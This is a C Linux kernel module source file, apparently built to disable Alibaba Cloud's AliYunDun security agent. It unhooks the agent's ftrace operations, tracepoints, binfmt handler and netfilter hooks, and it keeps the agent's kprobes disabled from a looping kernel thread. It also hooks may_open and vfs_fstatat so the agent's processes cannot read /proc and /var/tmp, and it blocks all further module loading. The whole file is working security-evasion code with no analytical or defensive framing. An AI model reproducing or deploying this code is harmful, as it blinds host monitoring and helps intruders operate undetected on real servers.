```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <asm/page.h>
#include <linux/version.h>
#include <asm/cmpxchg.h>
#include <linux/namei.h>
#include <linux/tracepoint.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/inotify.h>
#include <asm/ptrace.h>
#include <linux/types.h>
#include <linux/rwlock_types.h>
#include <linux/binfmts.h>
#include <net/net_namespace.h>
#include <linux/netfilter.h>
#include <linux/list.h>
#include <linux/kthread.h>
#include <linux/miscdevice.h>
#include <linux/signal.h>
#include <linux/fs.h>
#include <linux/fdtable.h>
#include <asm/bitops.h>
#include <linux/dcache.h>
#include <uapi/linux/limits.h>
#include <linux/vmalloc.h>

static const char *ali_sec_proc_mod_name = "AliSecProc";
static const char *ali_sec_net_mod_name = "AliSecNet";
static const char *ali_sec_guard_mod_name = "AliSecGuard";

static const char *ali_monitor_process_comm = "AliYunDunMonito";
static const char *ali_yundun_process_comm  = "AliYunDun";
static const char *ali_update_process_comm  = "AliYunDunUpdate";
static const char *ali_detect_process_comm  = "AliDetect";
static const char *ali_hips_process_comm  = "AliHips";
static const char *ali_net_process_comm  = "AliNet";
static const char *ali_sec_check_process_comm  = "AliSecureCheckA";

// file protect
static const char *protect_dir_paths[] = {"/var/tmp/", "/proc/"};
static const char *not_alloc_progs[] = {"AliYunDunMonito", "AliYunDun", "Ali", "ali"};

// ftrace
static struct ftrace_ops *p_ftrace_list_end = NULL;
static struct ftrace_ops **pp_ftrace_ops_list = NULL;
static struct mutex *p_ftrace_lock = NULL;

static int ali_sec_proc_ftrace_ops_idx = 0;
static struct ftrace_ops *ali_sec_proc_ftrace_ops[1024] = {NULL};

//try_module_get
static bool try_module_get_ali_sec_proc_filter = false;
static bool try_module_get_ali_net_filter = false;
static bool try_module_get_ali_sec_guard = false;

// ali sec guard module
static struct module *p_ali_sec_guard_module = NULL;

// ali netfilter
static void *ali_net_filter_module_init;
static void *ali_net_filter_module_core;
static unsigned int ali_net_filter_module_init_size;
static unsigned int ali_net_filter_module_core_size;
static struct module *p_ali_net_filter_module = NULL;
static struct mutex *p_nf_hook_mutex = NULL;
static struct list_head ***p_nf_hooks = NULL;
static int is_ali_netfilter_info_collect_disable = 0;
static LIST_HEAD(netfilter_ipv4_local_in_list);
static LIST_HEAD(netfilter_ipv4_local_out_list);

// ali sec proc module
static struct mutex *p_module_mutex = NULL;
static void *ali_proc_filter_module_init;
static void *ali_proc_filter_module_core;
static unsigned int ali_proc_filter_module_init_size;
static unsigned int ali_proc_filter_module_core_size;
static struct module *p_ali_sec_proc_filter_module = NULL;
static int is_ali_kmod_proc_info_collect_disable = 0;

// bypass kernel protect for load elf
static rwlock_t *p_binfmt_lock = NULL;
static struct linux_binfmt *ali_binfmt;
static struct list_head *p_formats = NULL;

// bypass agent bpf kprobe
#define KPROBE_HASH_BITS 6
#define KPROBE_TABLE_SIZE (1 << KPROBE_HASH_BITS)
static struct hlist_head *p_kprobe_table = NULL;
static struct mutex *p_kprobe_mutex = NULL;
static char *ali_kprobes_name[] = {
    "cn_netlink_send",
    "sys_execve",
    "tcp_connect",
    "unix_stream_connect",
    "do_sys_open"};
static struct kprobe *ali_kprobes[ARRAY_SIZE(ali_kprobes_name)];
static int ali_kprobes_real_count = 0;
static int is_ali_kprobes_disable = 0;
static struct task_struct *auto_disable_ali_kprobe_thread = NULL;

/// kallsyms_lookup_name
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void)
{

    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
}

// file protect
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
#define ftrace_regs pt_regs

static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
{
    return fregs;
}
#endif

/*
 * There are two ways of preventing vicious recursive loops when hooking:
 * - detect recusion using function return address (USE_FENTRY_OFFSET = 0)
 * - avoid recusion by jumping over the ftrace call (USE_FENTRY_OFFSET = 1)
 */
#define USE_FENTRY_OFFSET 0

/**
 * struct ftrace_hook    describes the hooked function
 *
 * @name:           the name of the hooked function
 *
 * @function:       the address of the wrapper function that will be called instead of
 *                     the hooked function
 *
 * @original:           a pointer to the place where the address
 *                     of the hooked function should be stored, filled out during installation of
 *             the hook
 *
 * @address:        the address of the hooked function, filled out during installation
 *             of the hook
 *
 * @ops:                ftrace service information, initialized by zeros;
 *                      initialization is finished during installation of the hook
 */
struct ftrace_hook
{
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

#define HOOK(_name, _function, _original) \
    {                                     \
        .name = (_name),                  \
        .function = (_function),          \
        .original = (_original),          \
    }

static int resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = my_kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk("unresolved symbol: %s\n", hook->name);
        return -1;
    }

    *((unsigned long *)hook->original) = hook->address;

    return 0;
}

static inline bool within_module(unsigned long addr, const struct module *mod)
{
    return within_module_init(addr, mod) || within_module_core(addr, mod);
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;

    err = resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY | FTRACE_OPS_FL_RECURSION;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err)
    {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err)
    {
        printk("register_ftrace_function() failed: %d\n", err);

        /* Don’t forget to turn off ftrace in case of an error. */
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);

        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err)
    {
        printk("unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
    {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
    }
}

static int get_pid_by_name(const char *proc_name)
{
    struct task_struct *task;
    int pid = -1;

    rcu_read_lock();
    for_each_process(task){
        if(strcmp(task->comm,proc_name) == 0){
            pid = task->pid;
            break;
        }
    }
    rcu_read_unlock();

    return pid;
}

// 0 allow
// -1 not allow
static int check_allow_access(char *path)
{
    int i;
    int path_hit = 0;
    int prog_hit = 0;

    char ali_monitor_process_proc_path[64] = {0};
    char ali_yundun_process_proc_path[64] = {0};
    char ali_update_process_proc_path[64] = {0};
    char ali_detect_process_proc_path[64] = {0};
    char ali_hips_process_proc_path[64] = {0};
    char ali_net_process_proc_path[64] = {0};
    char ali_sec_check_proc_path[64] = {0};

    int ali_monitor_process_pid = -1;
    int ali_yundun_process_pid  = -1;
    int ali_update_process_pid  = -1;
    int ali_detect_process_pid  = -1;
    int ali_hips_process_pid  = -1;
    int ali_net_process_pid  = -1;
    int ali_sec_check_process_pid = -1;

    if (!get_current())
        return -1;

    ali_monitor_process_pid = get_pid_by_name(ali_monitor_process_comm);
    ali_yundun_process_pid  = get_pid_by_name(ali_yundun_process_comm);
    ali_update_process_pid  = get_pid_by_name(ali_update_process_comm);
    ali_detect_process_pid  = get_pid_by_name(ali_detect_process_comm);
    ali_hips_process_pid  = get_pid_by_name(ali_hips_process_comm);  
    ali_net_process_pid  = get_pid_by_name(ali_net_process_comm);
    ali_sec_check_process_pid = get_pid_by_name(ali_sec_check_process_comm);
    

    snprintf(ali_monitor_process_proc_path, sizeof(ali_monitor_process_proc_path) - 1, "/proc/%d", ali_monitor_process_pid);
    snprintf(ali_yundun_process_proc_path, sizeof(ali_yundun_process_proc_path) - 1, "/proc/%d", ali_yundun_process_pid);
    snprintf(ali_update_process_proc_path, sizeof(ali_update_process_proc_path) - 1, "/proc/%d", ali_update_process_pid);
    snprintf(ali_detect_process_proc_path, sizeof(ali_detect_process_proc_path) - 1, "/proc/%d", ali_detect_process_pid);
    snprintf(ali_hips_process_proc_path, sizeof(ali_hips_process_proc_path) - 1, "/proc/%d", ali_hips_process_pid);
    snprintf(ali_net_process_proc_path, sizeof(ali_net_process_proc_path) - 1, "/proc/%d", ali_net_process_pid);
    snprintf(ali_sec_check_proc_path, sizeof(ali_sec_check_proc_path) - 1, "/proc/%d", ali_sec_check_process_pid);

    for (i = 0; i < ARRAY_SIZE(protect_dir_paths); i++)
    {
        if ( (strlen(path) >= strlen(protect_dir_paths[i])) && (strncmp(path, protect_dir_paths[i], strlen(protect_dir_paths[i])) == 0) )
        {
            path_hit = 1;
            break;
        }
    }

    if ( (strlen(path) >= strlen(ali_monitor_process_proc_path)) && (strncmp(path, ali_monitor_process_proc_path, strlen(ali_monitor_process_proc_path)) == 0))
    {
        path_hit = 0;
    }
    else if ( (strlen(path) >= strlen(ali_yundun_process_proc_path)) && (strncmp(path, ali_yundun_process_proc_path, strlen(ali_yundun_process_proc_path)) == 0) )
    {
        path_hit = 0;
    }
    else if ( (strlen(path) >= strlen(ali_update_process_proc_path)) && (strncmp(path, ali_update_process_proc_path, strlen(ali_update_process_proc_path)) == 0) )
    {
        path_hit = 0;
    }
    else if ( (strlen(path) >= strlen(ali_detect_process_proc_path)) && (strncmp(path, ali_detect_process_proc_path, strlen(ali_detect_process_proc_path)) == 0) )
    {
        path_hit = 0;
    }
    else if ( (strlen(path) >= strlen(ali_hips_process_proc_path)) && (strncmp(path, ali_hips_process_proc_path, strlen(ali_hips_process_proc_path)) == 0) )
    {
        path_hit = 0;
    }
    else if ( (strlen(path) >= strlen(ali_net_process_proc_path)) && (strncmp(path, ali_net_process_proc_path, strlen(ali_net_process_proc_path)) == 0) )
    {
        path_hit = 0;
    }
    else if ( (strlen(path) >= strlen(ali_sec_check_proc_path)) && (strncmp(path, ali_sec_check_proc_path, strlen(ali_sec_check_proc_path)) == 0) )
    {
        path_hit = 0;
    }

    for (i = 0; i < ARRAY_SIZE(not_alloc_progs); i++)
    {
        if ( (strlen(get_current()->comm) >= strlen(not_alloc_progs[i])) && (strncmp(get_current()->comm, not_alloc_progs[i], strlen(not_alloc_progs[i])) == 0) )
        {
            prog_hit = 1;
            break;
        }
    }

#ifdef DEBUG
    if((prog_hit == 1)&&(path_hit == 0)){
        printk("process(pid:%d comm:%s) want access %s\n",get_current()->pid,get_current()->comm,path);
    }
#endif

    if ((prog_hit == 1) && (path_hit == 1))
    {
        return -1;
    }
    else
    {
        return 0;
    }
}

static asmlinkage int (*real_may_open)(struct path *path, int acc_mode, int flag);
static asmlinkage int fh_may_open(struct path *path, int acc_mode, int flag)
{
    int ret;
    char *cp;
    char path_buf[256] = {0};

    cp = d_path(path, path_buf, sizeof(path_buf));
    if (!IS_ERR(cp))
    {
        if ((check_allow_access(cp)) == 0)
        {
            ret = real_may_open(path, acc_mode, flag);
        }
        else
        {
            ret = -ENOENT;
        }
    }
    else
    {
        ret = real_may_open(path, acc_mode, flag);
    }

    return ret;
}

static asmlinkage int (*real_vfs_fstatat)(int dfd, const char __user *filename, struct kstat *stat, int flag);
static asmlinkage int fh_vfs_fstatat(int dfd, const char __user *filename, struct kstat *stat, int flag)
{
    int ret;
    int error;
    struct path path;
    char *cp;
    unsigned int lookup_flags = LOOKUP_FOLLOW | LOOKUP_AUTOMOUNT;
    char path_buf[256] = {0};

    error = user_path_at(dfd, filename, lookup_flags, &path);

    if (error)
    {
        ret = real_vfs_fstatat(dfd, filename, stat, flag);
        return ret;
    }
    else
    {
        cp = d_path(&path, path_buf, sizeof(path_buf));
        if (!IS_ERR(cp))
        {
            if ((check_allow_access(cp)) == 0)
            {
                ret = real_vfs_fstatat(dfd, filename, stat, flag);
            }
            else
            {
                ret = -ENOENT;
            }
        }
        else
        {
            ret = real_vfs_fstatat(dfd, filename, stat, flag);
        }
    }

    path_put(&path);
    return ret;
}

struct load_info {
 Elf_Ehdr *hdr;
 unsigned long len;
 Elf_Shdr *sechdrs;
 char *secstrings, *strtab;
 unsigned long symoffs, stroffs;
 struct _ddebug *debug;
 unsigned int num_debug;
 bool sig_ok;
 struct {
  unsigned int sym, str, mod, vers, info, pcpu;
 } index;
};
static asmlinkage int (*real_load_module)(struct load_info *info, const char __user *uargs, int flags);
static asmlinkage int fh_load_module(struct load_info *info, const char __user *uargs, int flags)
{
    vfree(info->hdr);
    return 0;
}

static struct ftrace_hook my_ali_proc_self_hooked_functions[] = {
    HOOK("may_open", fh_may_open, &real_may_open),
    HOOK("vfs_fstatat", fh_vfs_fstatat, &real_vfs_fstatat),
    HOOK("load_module", fh_load_module, &real_load_module),
};

static int install_my_ali_proc_self_ftraces(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(my_ali_proc_self_hooked_functions); i++)
    {
        fh_install_hook(my_ali_proc_self_hooked_functions + i);
    }
    return 0;
}

static int uninstall_my_ali_proc_self_ftraces(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(my_ali_proc_self_hooked_functions); i++)
    {
        fh_remove_hook(my_ali_proc_self_hooked_functions + i);
    }

    return 0;
}

static struct module *my_found_module(const char *name)
{
    struct module *module_ret = NULL;
    struct module *p_module = NULL;

    // get ali module info
    p_module_mutex = (struct mutex *)my_kallsyms_lookup_name("module_mutex");
    if (p_module_mutex == NULL)
    {
#ifdef DEBUG
        printk("get module_mutex faild\n");
#endif
        return module_ret;
    }
    mutex_lock(p_module_mutex);
    list_for_each_entry(p_module, &(__this_module.list), list)
    {
        if (strncmp(name, p_module->name, strlen(name)) == 0)
        {
            module_ret = p_module;
            break;
        }
    }
    mutex_unlock(p_module_mutex);

    return module_ret;
}


static struct linux_binfmt *find_ali_binfmt(void)
{
    struct linux_binfmt *fmt;
    struct linux_binfmt *ret_fmt = NULL;

    read_lock(p_binfmt_lock);

    list_for_each_entry(fmt, p_formats, lh)
    {
        if (fmt->module == p_ali_sec_proc_filter_module)
        {
            ret_fmt = fmt;
            break;
        }
    }

    read_unlock(p_binfmt_lock);

    return fmt;
}

static int disable_ali_kmod_proc_info_collect(void)
{
    struct ftrace_ops **p;
    int i = 0;

    // get ali module info
    if (p_ali_sec_proc_filter_module == NULL)
    {
#ifdef DEBUG
        printk("find AliSecProcFilter module error\n");
#endif
        return -1;
    }
    else
    {
#ifdef DEBUG
        printk("find AliSecProcFilter module ok\n");
#endif
    }

    // bypass ftrace hook
    p_ftrace_lock = (struct mutex *)my_kallsyms_lookup_name("ftrace_lock");
    if (p_ftrace_lock == NULL)
    {
#ifndef DEBUG
        printk("get ftrace_lock error\n");
#endif
        return -1;
    }
    pp_ftrace_ops_list = (struct ftrace_ops **)my_kallsyms_lookup_name("ftrace_ops_list");
    if (pp_ftrace_ops_list == NULL)
    {
#ifdef DEBUG
        printk("get ftrace_ops_list error\n");
#endif
        return -1;
    }
    p_ftrace_list_end = (struct ftrace_ops *)my_kallsyms_lookup_name("ftrace_list_end");
    if (p_ftrace_list_end == NULL)
    {
#ifdef DEBUG
        printk("get ftrace_list_end error\n");
#endif
        return -1;
    }
    
    mutex_lock(p_ftrace_lock);
    for (p = pp_ftrace_ops_list; *p != p_ftrace_list_end; p = &(*p)->next)
    {
        if (((unsigned long)ali_proc_filter_module_core < (unsigned long)(*p)->func) && ((unsigned long)(*p)->func < ((unsigned long)ali_proc_filter_module_core + ali_proc_filter_module_core_size)))
        {
#ifdef DEBUG
            printk("find ali sec mod ftrace ops\n");
#endif
            ali_sec_proc_ftrace_ops[ali_sec_proc_ftrace_ops_idx++] = *p;
        }
    }
    mutex_unlock(p_ftrace_lock);
    
    if (ali_sec_proc_ftrace_ops_idx == 0)
    {
#ifdef DEBUG
        printk("get ali ftrace ops error");
#endif
        return -1;
    }
    for (i = 0; i < ali_sec_proc_ftrace_ops_idx; i++)
    {
        if (unregister_ftrace_function(ali_sec_proc_ftrace_ops[i]) != 0)
        {
#ifdef DEBUG
            printk("unregister ali sec mod ftrace function error\n");
#endif
        }
        else
        {
#ifdef DEBUG
            printk("unregister ali sec mod ftrace function success\n");
#endif
        }
    }

    // bypass ssched_process_fork trace
    tracepoint_probe_unregister("sched_process_fork", NULL, NULL);
    tracepoint_probe_unregister("sched_process_exit", NULL, NULL);

    // bypass load elf format trace
    p_formats = (struct list_head *)my_kallsyms_lookup_name("formats");
    if (p_formats == NULL)
    {
#ifdef DEBUG
        printk("get formats addr error\n");
#endif
        return -1;
    }
    p_binfmt_lock = (rwlock_t *)my_kallsyms_lookup_name("binfmt_lock");
    if (p_binfmt_lock == NULL)
    {
#ifdef DEBUG
        printk("get binfmt_lock addr error\n");
#endif
        return -1;
    }
    ali_binfmt = find_ali_binfmt();
    if (ali_binfmt == NULL)
    {
#ifdef DEBUG
        printk("get ali binfmt error\n");
#endif
        return -1;
    }
    unregister_binfmt(ali_binfmt);

    is_ali_kmod_proc_info_collect_disable = 1;
    return 0;
}

static void enable_ali_kmod_proc_info_collect(void)
{
    int i = 0;
    if ( (is_ali_kmod_proc_info_collect_disable == 0) || 
         (my_found_module(ali_sec_proc_mod_name) != p_ali_sec_proc_filter_module)
     )
        return;

    for (i = 0; i < ali_sec_proc_ftrace_ops_idx; i++)
    {
        register_ftrace_function(ali_sec_proc_ftrace_ops[i]);
    }

    register_binfmt(ali_binfmt);
}

static void traverse_kprobe_table(void)
{
    struct hlist_head *head;
    struct kprobe *p;
    unsigned int i;

    mutex_lock(p_kprobe_mutex);
    for (i = 0; i < KPROBE_TABLE_SIZE; i++)
    {
        head = p_kprobe_table + i;
        hlist_for_each_entry_rcu(p, head, hlist)
        {
            printk("kprobe name :%s\n", p->symbol_name);
        }
    }
    mutex_unlock(p_kprobe_mutex);
}

static void get_ali_kprobes(void)
{
    struct hlist_head *head;
    struct kprobe *p;
    unsigned int i;
    unsigned int k;
    unsigned int ali_kprobes_idx = 0;

    ali_kprobes_real_count = 0;

    mutex_lock(p_kprobe_mutex);
    for (i = 0; i < KPROBE_TABLE_SIZE; i++)
    {
        head = p_kprobe_table + i;
        hlist_for_each_entry_rcu(p, head, hlist)
        {
            for (k = 0; k < ARRAY_SIZE(ali_kprobes_name); k++)
            {
                if (strcmp(p->symbol_name, ali_kprobes_name[k]) == 0)
                {
#ifdef DEBUG
                    printk("find ali kprob %s\n", p->symbol_name);
#endif
                    ali_kprobes[ali_kprobes_idx] = p;
                    ali_kprobes_idx++;
                    break;
                }
            }
        }
    }

    ali_kprobes_real_count = ali_kprobes_idx;
    mutex_unlock(p_kprobe_mutex);
}

static void disable_ali_kprobes(void)
{
    unsigned int i;
    get_ali_kprobes();
    for (i = 0; i < ali_kprobes_real_count; i++)
    {
// #ifdef DEBUG
//         printk("disable ali kprobe %s\n", ali_kprobes[i]->symbol_name);
// #endif
        disable_kprobe(ali_kprobes[i]);
    }
}

static void enable_ali_kprobes(void)
{
    unsigned int i;
    get_ali_kprobes();

    for (i = 0; i < ali_kprobes_real_count; i++)
    {
// #ifdef DEBUG
//         printk("enable ali kprobe %s\n", ali_kprobes[i]->symbol_name);
// #endif
        enable_kprobe(ali_kprobes[i]);
    }
}

static int auto_disable_ali_kprobe_func(void *data)
{
    while (!kthread_should_stop())
    {
        disable_ali_kprobes();
        msleep(1000 * 30); // 30 seconds
    }

    return 0;
}

static int disable_ali_kprobe_info_collect(void)
{
    p_kprobe_mutex = (struct mutex *)my_kallsyms_lookup_name("kprobe_mutex");
    if (p_kprobe_mutex == NULL)
    {
#ifdef DEBUG
        printk("get kprobe mutex error\n");
#endif
        return -1;
    }
    p_kprobe_table = (struct hlist_head *)my_kallsyms_lookup_name("kprobe_table");
    if (p_kprobe_table == NULL)
    {
#ifdef DEBUG
        printk("get kprobe table error\n");
#endif
        return -1;
    }

#ifdef DEBUG
    printk("===================kprobe all table==========================\n");
    traverse_kprobe_table();
#endif
    

    auto_disable_ali_kprobe_thread = kthread_run(auto_disable_ali_kprobe_func, NULL, "kthread");

    is_ali_kprobes_disable = 1;
    return 0;
}

static void enable_ali_kprobe_info_collect(void)
{
    if(is_ali_kprobes_disable == 0) return;

    kthread_stop(auto_disable_ali_kprobe_thread);
    enable_ali_kprobes();
    return;
}

static int disable_ali_netfilter(void)
{
    struct nf_hook_ops *elem, *next;

    if (p_ali_net_filter_module == NULL)
    {
#ifdef DEBUG
        printk("find AliSecNetFlt module error\n");
#endif
        return -1;
    }
    else
    {
#ifdef DEBUG
        printk("find AliSecNetFlt module ok\n");
#endif
    }

    p_nf_hook_mutex = (struct mutex *)my_kallsyms_lookup_name("nf_hook_mutex");
    if (p_nf_hook_mutex == NULL)
    {
#ifdef DEBUG
        printk("get nf_hook_mutex error\n");
#endif
        return -1;
    }

    p_nf_hooks = (struct list_head ***)my_kallsyms_lookup_name("nf_hooks");
    if (p_nf_hooks == NULL)
    {
#ifdef DEBUG
        printk("get nf_hooks error\n");
#endif
        return -1;
    }

    mutex_lock(p_nf_hook_mutex);
    list_for_each_entry_safe(elem, next, p_nf_hooks[NFPROTO_IPV4][NF_INET_LOCAL_IN], list)
    {
        list_move(&elem->list, &netfilter_ipv4_local_in_list);
    }
    list_for_each_entry_safe(elem, next, p_nf_hooks[NFPROTO_IPV4][NF_INET_LOCAL_OUT], list)
    {
        list_move(&elem->list, &netfilter_ipv4_local_out_list);
    }
    mutex_unlock(p_nf_hook_mutex);

    is_ali_netfilter_info_collect_disable = 1;

    return 0;
}

static void enable_ali_netfilter(void)
{
    struct nf_hook_ops *elem, *next;

    if ((is_ali_netfilter_info_collect_disable == 0) || 
        (my_found_module(ali_sec_net_mod_name) != p_ali_net_filter_module)
    )
        return;

    mutex_lock(p_nf_hook_mutex);
    list_for_each_entry_safe(elem, next, &netfilter_ipv4_local_in_list, list)
    {
        list_move(&elem->list, p_nf_hooks[NFPROTO_IPV4][NF_INET_LOCAL_IN]);
    }
    list_for_each_entry_safe(elem, next, &netfilter_ipv4_local_out_list, list)
    {
        list_move(&elem->list, p_nf_hooks[NFPROTO_IPV4][NF_INET_LOCAL_OUT]);
    }
    mutex_unlock(p_nf_hook_mutex);
}

static int init_ali_module_info(void)
{
    struct module *p_module = NULL;
    p_module_mutex = (struct mutex *)my_kallsyms_lookup_name("module_mutex");
    if (p_module_mutex == NULL)
    {
#ifdef DEBUG
        printk("get module_mutex faild\n");
#endif
        return -1;
    }
    mutex_lock(p_module_mutex);
    list_for_each_entry(p_module, &(__this_module.list), list)
    {
        if (strncmp(ali_sec_proc_mod_name, p_module->name, strlen(ali_sec_proc_mod_name)) == 0)
        {
            p_ali_sec_proc_filter_module = p_module;
            ali_proc_filter_module_core = p_ali_sec_proc_filter_module->module_core;
            ali_proc_filter_module_init = p_ali_sec_proc_filter_module->module_init;
            ali_proc_filter_module_core_size = p_ali_sec_proc_filter_module->core_size;
            ali_proc_filter_module_init_size = p_ali_sec_proc_filter_module->init_size;
            try_module_get_ali_sec_proc_filter = try_module_get(p_ali_sec_proc_filter_module);
        }
        if (strncmp(ali_sec_net_mod_name, p_module->name, strlen(ali_sec_net_mod_name)) == 0)
        {
            p_ali_net_filter_module = p_module;
            ali_net_filter_module_core = p_ali_net_filter_module -> module_core;
            ali_net_filter_module_init = p_ali_net_filter_module -> module_init;
            ali_net_filter_module_core_size = p_ali_net_filter_module->core_size;
            ali_net_filter_module_init_size = p_ali_net_filter_module->init_size;
            try_module_get_ali_net_filter = try_module_get(p_ali_net_filter_module);
        }
        if (strncmp(ali_sec_guard_mod_name, p_module->name, strlen(ali_sec_guard_mod_name)) == 0)
        {
            p_ali_sec_guard_module = p_module;
            try_module_get_ali_sec_guard =  try_module_get(p_ali_sec_guard_module);
        }
    }
    mutex_unlock(p_module_mutex);
 return 0;
}

static int free_ali_module_info(void)
{
    if((try_module_get_ali_sec_proc_filter) && (my_found_module(ali_sec_proc_mod_name) == p_ali_sec_proc_filter_module))
        module_put(p_ali_sec_proc_filter_module);

    if((try_module_get_ali_net_filter) && (my_found_module(ali_sec_net_mod_name) == p_ali_net_filter_module))
        module_put(p_ali_net_filter_module);

    if((try_module_get_ali_sec_guard) && (my_found_module(ali_sec_guard_mod_name) == p_ali_sec_guard_module))
        module_put(p_ali_sec_guard_module);
    
    return 0;
}

static int __init myinit(void)
{
#ifdef DEBUG
    printk("my hello module init\n");
#endif
    //init
    init_ksymbol();
    init_ali_module_info();

    //disable AliSecProc module
    disable_ali_kprobe_info_collect();
    disable_ali_kmod_proc_info_collect();
    install_my_ali_proc_self_ftraces(); // load_module 、 may_open 、vfs_stat

    //disable AliNetflt module
    disable_ali_netfilter();

    return 0;
}

static void __exit myexit(void)
{
#ifdef DEBUG
    printk("my hello module exit\n");
#endif

    //enable AliNetflt module
    enable_ali_netfilter();

    //enable AliSecProc module
    enable_ali_kprobe_info_collect();
    uninstall_my_ali_proc_self_ftraces();
    enable_ali_kmod_proc_info_collect();

    free_ali_module_info();
}

module_init(myinit);
module_exit(myexit);
MODULE_LICENSE("GPL");
```